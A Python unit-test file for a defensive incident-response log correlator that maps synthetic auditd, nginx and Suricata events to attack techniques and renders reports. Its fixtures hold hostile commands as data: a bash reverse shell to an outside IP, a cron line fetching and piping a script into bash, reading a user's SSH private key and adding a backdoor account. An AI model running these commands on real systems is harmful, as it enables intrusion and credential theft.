import unittest
import json
import os
import copy

from bluekit.ir.correlator import correlate_incident
from bluekit.ir.report import build_incident_model, render_scoring_json, render_markdown_report

FORBIDDEN = ["web-prod-01", "db-prod-02", "10.0.1.15", "10.0.2.20", "198.51.100.45", "203.0.113.88", "backup_daemon", "3110",
"stolen_id_rsa", "vault_backup", "customers_dump", "upload_avatar", "shell_assets", "PostgreSQL", "/api/v1/products", "agent.sh"]

class TestIRNoSample(unittest.TestCase):
    def test_source_has_no_sample_literals(self):
        for filename in ['bluekit/ir/report.py', 'bluekit/ir/correlator.py']:
            path = os.path.join(os.path.dirname(__file__), '..', filename)
            with open(path, 'r', encoding='utf-8') as f:
                content = f.read()
                for word in FORBIDDEN:
                    if filename == 'bluekit/ir/correlator.py' and word == 'PostgreSQL':
                        continue
                    self.assertNotIn(word, content, f"'{word}' found in {filename}")

    def test_other_scenario_report_clean(self):
        events = [
            {"@timestamp": "2026-09-18T10:00:00Z", "event": {"dataset": "nginx.access"}, "host": {"name": "acc-pc-07"}, "source": {"ip": "45.155.205.10"}, "http": {"response": {"status_code": 200}}, "url": {"path": "/uploads/img.php", "query": ""}, "message": "GET /uploads/img.php"},
            {"@timestamp": "2026-09-18T10:05:00Z", "event": {"dataset": "auditd"}, "host": {"name": "acc-pc-07"}, "user": {"name": "www-data"}, "process": {"command_line": "id"}, "message": "id"},
            {"@timestamp": "2026-09-18T10:10:00Z", "event": {"dataset": "auditd"}, "host": {"name": "acc-pc-07"}, "user": {"name": "www-data"}, "process": {"command_line": "bash -i >& /dev/tcp/45.155.205.10/9001 0>&1"}, "message": "bash -i >& /dev/tcp/45.155.205.10/9001 0>&1"},
            {"@timestamp": "2026-09-18T10:15:00Z", "event": {"dataset": "auditd"}, "host": {"name": "acc-pc-07"}, "user": {"name": "root"}, "process": {"command_line": "useradd -m svc_upd"}, "message": "useradd -m svc_upd"},
            {"@timestamp": "2026-09-18T10:20:00Z", "event": {"dataset": "auditd"}, "host": {"name": "acc-pc-07"}, "user": {"name": "root"}, "process": {"command_line": "cat /home/ali/.ssh/id_ed25519"}, "message": "cat /home/ali/.ssh/id_ed25519"},
            {"@timestamp": "2026-09-18T10:25:00Z", "event": {"dataset": "suricata"}, "host": {"name": "srv-files"}, "message": "ET High Volume Outbound to 91.215.85.20"}
        ]
        chain = correlate_incident(events, heuristic_fallback=True)
        model = build_incident_model(chain, "test", len(events))
        
        ru_md = render_markdown_report(model, "ru")
        uz_md = render_markdown_report(model, "uz")
        en_md = render_markdown_report(model, "en")
        scoring = render_scoring_json(model)
        model_json = json.dumps(model.to_dict() if hasattr(model, 'to_dict') else model.__dict__, default=str)

        for word in FORBIDDEN:
            self.assertNotIn(word, ru_md, f"{word} found in RU markdown")
            self.assertNotIn(word, uz_md, f"{word} found in UZ markdown")
            self.assertNotIn(word, en_md, f"{word} found in EN markdown")
            self.assertNotIn(word, scoring, f"{word} found in scoring JSON")
            self.assertNotIn(word, model_json, f"{word} found in model JSON")

        containment = " ".join(model.recommendations['containment'])
        eradication = " ".join(model.recommendations['eradication'])
        self.assertIn("acc-pc-07", containment)
        self.assertIn("45.155.205.10", containment)
        self.assertIn("svc_upd", eradication)
        
        has_key = any(s.iocs.get('target_key') == "/home/ali/.ssh/id_ed25519" for s in chain.stages)
        self.assertTrue(has_key)
        self.assertIn("91.215.85.20", chain.exfiltration_ips)
        
        svc_upd_role = next((i['role'] for i in model.all_iocs if i['type'] == 'Account' and i['value'] == 'svc_upd'), None)
        self.assertEqual(svc_upd_role, "Backdoor Account")
        # emoji haqiqiy belgi bo'lishi kerak, "\U0001F534" matni emas
        self.assertNotIn("\\U0001F534", ru_md)
        self.assertNotIn("\\U0001F534", en_md)
        self.assertIn("\U0001F534", ru_md)

    def test_generic_suricata_alert_not_exfil(self):
        events = [{"@timestamp": "2026-09-18T10:00:00Z", "event": {"dataset": "suricata"}, "message": "Suricata [Alert 1:2010935:3] ET POLICY Suspicious inbound to MSSQL port 1433"}]
        chain = correlate_incident(events, heuristic_fallback=False)
        self.assertFalse(any(s.technique_id == "T1048" for s in chain.stages))
        self.assertEqual(chain.exfiltration_ips, [])

    def test_exfil_without_ip_has_no_fake_ip(self):
        events = [{"@timestamp": "2026-09-18T10:00:00Z", "event": {"dataset": "suricata"}, "message": "High Volume Outbound HTTPS POST"}]
        chain = correlate_incident(events, heuristic_fallback=False)
        self.assertEqual(chain.exfiltration_ips, [])
        t1048 = [s for s in chain.stages if s.technique_id == "T1048"]
        self.assertEqual(len(t1048), 1)
        self.assertNotIn("dst_ip", t1048[0].iocs)
        self.assertNotIn("port", t1048[0].iocs)

    def test_recon_id_word_boundary(self):
        events = [
            {"@timestamp": "2026-09-18T10:00:00Z", "event": {"dataset": "auditd"}, "user": {"name": "www-data"}, "process": {"command_line": "pidof php-fpm"}, "message": ""},
            {"@timestamp": "2026-09-18T10:01:00Z", "event": {"dataset": "auditd"}, "user": {"name": "www-data"}, "process": {"command_line": "cat /tmp/uuid.txt"}, "message": ""},
            {"@timestamp": "2026-09-18T10:02:00Z", "event": {"dataset": "auditd"}, "user": {"name": "www-data"}, "process": {"command_line": "id"}, "message": ""},
            {"@timestamp": "2026-09-18T10:03:00Z", "event": {"dataset": "auditd"}, "user": {"name": "www-data"}, "process": {"command_line": "/usr/bin/id"}, "message": ""},
            {"@timestamp": "2026-09-18T10:04:00Z", "event": {"dataset": "auditd"}, "user": {"name": "www-data"}, "process": {"command_line": "ls; whoami"}, "message": ""}
        ]
        chain = correlate_incident(events, heuristic_fallback=False)
        t1033s = [s for s in chain.stages if s.technique_id == "T1033"]
        self.assertEqual(len(t1033s), 3)

    def test_cron_rule(self):
        events = [
            {"@timestamp": "2026-09-18T10:00:00Z", "event": {"dataset": "auditd"}, "process": {"command_line": "crontab -l"}},
            {"@timestamp": "2026-09-18T10:01:00Z", "event": {"dataset": "auditd"}, "process": {"command_line": "/usr/sbin/cron -f"}},
            {"@timestamp": "2026-09-18T10:02:00Z", "event": {"dataset": "auditd"}, "process": {"command_line": "crontab /tmp/x.cron"}},
            {"@timestamp": "2026-09-18T10:03:00Z", "event": {"dataset": "auditd"}, "process": {"command_line": "echo '*/15 * * * * curl -s http://x/a | bash' >> /tmp/.c"}},
            {"@timestamp": "2026-09-18T10:04:00Z", "event": {"dataset": "auditd"}, "process": {"command_line": "echo \"* * * * * root /tmp/b\" > /etc/cron.d/b"}},
            # jadval ifodasi bo'sh joydan keyin (qo'shtirnoqsiz) ham tanilishi kerak
            {"@timestamp": "2026-09-18T10:05:00Z", "event": {"dataset": "auditd"}, "process": {"command_line": "sh -c 0 3 * * * /tmp/y"}}
        ]
        chain = correlate_incident(events, heuristic_fallback=False)
        crons = [s for s in chain.stages if s.technique_id == "T1053.003"]
        self.assertEqual(len(crons), 4)

    def test_useradd_without_name(self):
        events = [{"@timestamp": "2026-09-18T10:00:00Z", "event": {"dataset": "auditd"}, "process": {"command_line": "useradd"}}]
        chain = correlate_incident(events, heuristic_fallback=False)
        self.assertNotIn("backup_daemon", chain.compromised_users)
        t1136 = [s for s in chain.stages if s.technique_id == "T1136.001"]
        self.assertEqual(len(t1136), 1)
        self.assertNotIn("created_user", t1136[0].iocs)

    def test_archive_and_ssh_values_from_log(self):
        events = [
            {"@timestamp": "2026-09-18T10:00:00Z", "event": {"dataset": "auditd"}, "process": {"command_line": "tar -czf /var/tmp/x.tgz /etc"}},
            {"@timestamp": "2026-09-18T10:01:00Z", "event": {"dataset": "auditd"}, "process": {"command_line": "zip -r out.zip docs"}},
            {"@timestamp": "2026-09-18T10:02:00Z", "event": {"dataset": "system.auth"}, "message": "sshd[1]: Accepted publickey for bob from 10.9.9.9 port 5555 ssh2"},
            {"@timestamp": "2026-09-18T10:03:00Z", "event": {"dataset": "system.auth"}, "message": "ssh -i /var/tmp/k root@10.5.5.5"}
        ]
        chain = correlate_incident(events, heuristic_fallback=False)
        arcs = [s for s in chain.stages if s.technique_id == "T1560.001"]
        self.assertEqual(len(arcs), 2)
        self.assertEqual(arcs[0].iocs.get("archive_file"), "/var/tmp/x.tgz")
        self.assertEqual(arcs[1].iocs.get("archive_file"), "out.zip")

        sshs = [s for s in chain.stages if s.technique_id == "T1021.004"]
        self.assertEqual(len(sshs), 2)
        self.assertNotIn("target", sshs[0].iocs)
        self.assertNotIn("key", sshs[0].iocs)
        self.assertEqual(sshs[1].iocs.get("target"), "10.5.5.5")
        self.assertEqual(sshs[1].iocs.get("key"), "/var/tmp/k")

    def test_empty_chain_renders(self):
        events = [{"@timestamp": "2026-09-18T10:00:00Z", "event": {"dataset": "nginx"}, "url": {"path": "/static/style.css"}, "http": {"response": {"status_code": 200}}}]
        chain = correlate_incident(events, heuristic_fallback=False)
        self.assertEqual(len(chain.stages), 0)
        model = build_incident_model(chain, "test", len(events))
        ru_md = render_markdown_report(model, "ru")
        uz_md = render_markdown_report(model, "uz")
        en_md = render_markdown_report(model, "en")
        for word in FORBIDDEN:
            self.assertNotIn(word, ru_md)
            self.assertNotIn(word, uz_md)
            self.assertNotIn(word, en_md)
        self.assertIn("- —", ru_md)

    def test_no_none_iocs(self):
        events = [
            {"@timestamp": "2026-09-18T10:00:00Z", "event": {"dataset": "nginx.access"}, "host": {"name": "acc-pc-07"}, "source": {"ip": "45.155.205.10"}, "http": {"response": {"status_code": 200}}, "url": {"path": "/uploads/img.php", "query": ""}, "message": "GET /uploads/img.php"},
            {"@timestamp": "2026-09-18T10:05:00Z", "event": {"dataset": "auditd"}, "host": {"name": "acc-pc-07"}, "user": {"name": "www-data"}, "process": {"command_line": "id"}, "message": "id"},
            {"@timestamp": "2026-09-18T10:10:00Z", "event": {"dataset": "auditd"}, "host": {"name": "acc-pc-07"}, "user": {"name": "www-data"}, "process": {"command_line": "bash -i >& /dev/tcp/45.155.205.10/9001 0>&1"}, "message": "bash -i >& /dev/tcp/45.155.205.10/9001 0>&1"},
            {"@timestamp": "2026-09-18T10:15:00Z", "event": {"dataset": "auditd"}, "host": {"name": "acc-pc-07"}, "user": {"name": "root"}, "process": {"command_line": "useradd -m svc_upd"}, "message": "useradd -m svc_upd"},
            {"@timestamp": "2026-09-18T10:20:00Z", "event": {"dataset": "auditd"}, "host": {"name": "acc-pc-07"}, "user": {"name": "root"}, "process": {"command_line": "cat /home/ali/.ssh/id_ed25519"}, "message": "cat /home/ali/.ssh/id_ed25519"},
            {"@timestamp": "2026-09-18T10:25:00Z", "event": {"dataset": "suricata"}, "host": {"name": "srv-files"}, "message": "ET High Volume Outbound to 91.215.85.20"}
        ]
        chain = correlate_incident(events, heuristic_fallback=True)
        model = build_incident_model(chain, "test", len(events))
        for ioc in model.all_iocs:
            self.assertNotEqual(str(ioc.get('value')), "None")

if __name__ == '__main__':
    unittest.main()
